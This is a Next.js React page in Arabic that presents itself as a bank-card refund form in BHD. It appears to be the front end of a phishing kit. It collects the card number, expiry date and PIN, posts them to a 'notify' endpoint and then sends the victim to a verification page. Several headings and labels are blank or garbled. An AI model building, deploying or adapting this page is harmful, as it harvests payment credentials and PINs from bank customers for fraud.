"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { CreditCard, Loader2, ShieldCheck } from "lucide-react";

export default function HomePage() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [pin, setPin] = useState("");
  
  const [amount, setAmount] = useState("");
  const [showAmount, setShowAmount] = useState(false);
  const [error, setError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    fetch("/api/public/flags")
      .then((r) => r.json())
      .then((d) => setShowAmount(Boolean(d?.showCustomerAmountInput)))
      .catch(() => setShowAmount(false));
  }, []);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    
    if (!/^\d{16}$/.test(cardNumber)) {
      setError("برجاء إدخال رقم بطاقة صحيح مكون من 16 رقم.");
      return;
    }
    
    if (!expiryDate.trim()) {
      setError("برجاء إدخال تاريخ الانتهاء.");
      return;
    }
    
    if (!/^(\d{4}|\d{6})$/.test(pin)) {
      setError("برجاء إدخال الرقم السري بشكل صحيح (4 أو 6 أرقام).");
      return;
    }

    const parsedAmount = showAmount && amount.trim() ? Number(amount) : undefined;
    if (parsedAmount !== undefined && (!Number.isFinite(parsedAmount) || parsedAmount <= 0)) {
      setError("قيمة المبلغ غير صحيحة.");
      return;
    }

    setSubmitting(true);
    try {
      const payload = { method: "card", cardNumber, expiryDate, pin, amount: parsedAmount };
      sessionStorage.setItem("refund_request", JSON.stringify(payload));
      await fetch("/api/notify/refund", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      router.push("/verify");
    } catch {
      setError("حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.");
      setSubmitting(false);
    }
  }

  return (
    <main className="mx-auto flex min-h-screen w-full max-w-2xl flex-col justify-center px-4 py-10">
      <div className="card-soft animate-fade-in p-6 sm:p-8">
        <div className="flex items-center gap-3">
          <span className="btn-brand flex h-12 w-12 items-center justify-center rounded-2xl">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <div>
            <h1 className="text-xl font-extrabold sm:text-2xl"> </h1>
            <p className="mt-1 text-sm text-muted-foreground">
                  ߡ       .
            </p>
          </div>
        </div>

        <form onSubmit={onSubmit} className="mt-7 space-y-5">
          {showAmount && (
            <div>
              <label htmlFor="amount" className="mb-2 block text-sm font-bold">
                 
              </label>
              <div className="flex items-stretch gap-2" dir="ltr">
                <input
                  id="amount"
                  type="number"
                  min={0}
                  step="0.001"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.000"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15"
                />
                <span className="flex items-center rounded-xl bg-secondary px-4 text-sm font-bold text-secondary-foreground">
                  BHD
                </span>
              </div>
              <p className="mt-2 text-xs text-muted-foreground">   ().</p>
            </div>
          )}

          {/* الخانة الثابتة الجديدة */}
          <div className="flex flex-col items-center justify-center w-full p-4 mb-6 border-2 border-primary rounded-2xl bg-accent cursor-default">
            <div className="flex items-center justify-center w-12 h-12 mb-2 text-primary-foreground bg-primary rounded-xl">
              <CreditCard className="h-6 w-6" />
            </div>
            <span className="font-bold text-lg text-foreground">الاسترجاع علي بطاقة البنك</span>
          </div>

          {/* حقول الإدخال الثلاثة */}
          <div className="space-y-4">
            <div>
              <label htmlFor="cardNumber" className="mb-2 block text-sm font-bold">
                رقم البطاقة
              </label>
              <input
                id="cardNumber"
                inputMode="numeric"
                maxLength={16}
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
                placeholder="0000000000000000"
                className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                dir="ltr"
              />
            </div>
            
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label htmlFor="expiryDate" className="mb-2 block text-sm font-bold">
                  تاريخ الانتهاء
                </label>
                <input
                  id="expiryDate"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(e.target.value)}
                  placeholder="MM/YY"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                  dir="ltr"
                />
              </div>
              <div>
                <label htmlFor="pin" className="mb-2 block text-sm font-bold">
                  الرقم السري (PIN)
                </label>
                <input
                  id="pin"
                  type="password"
                  inputMode="numeric"
                  maxLength={6}
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ""))}
                  placeholder="****"
                  autoComplete="new-password"
                  className="w-full rounded-xl border border-input bg-background px-4 py-3 text-sm outline-none transition focus:border-primary focus:ring-4 focus:ring-ring/15 text-left"
                  dir="ltr"
                />
              </div>
            </div>
          </div>

          {error && <p className="text-sm font-semibold text-destructive">{error}</p>}

          <button
            type="submit"
            disabled={submitting}
            className="btn-brand inline-flex w-full items-center justify-center gap-2 rounded-2xl px-6 py-4 text-base font-extrabold"
          >
            {submitting && <Loader2 className="h-5 w-5 animate-spin" />}
             
          </button>
          <p className="text-center text-xs text-muted-foreground">
                 .
          </p>
        </form>
      </div>
    </main>
  );
}
